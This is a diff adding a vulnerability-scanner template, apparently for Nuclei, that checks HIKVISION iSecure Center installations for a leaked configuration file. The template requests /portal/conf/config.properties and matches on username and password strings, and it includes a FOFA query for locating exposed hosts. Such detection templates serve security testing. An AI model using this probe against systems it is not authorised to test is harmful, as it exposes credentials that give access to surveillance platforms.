@@ -1,0 +1,33 @@
+id: hikvision-disclosure
+
+info:
+  name: 海康威视综合安防管理平台信息泄露漏洞
+  author: fgz
+  severity: high
+  reference:
+    - none
+  description: |
+    HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。存在信息泄露漏洞，密码解密后可以登录后台。
+  metadata:
+    fofa-query: app="HIKVISION-综合安防管理平台"
+    veified: true
+  tags: hikvision
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/conf/config.properties"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '@bic'
+          - 'username'
+          - 'password'
+        condition: and
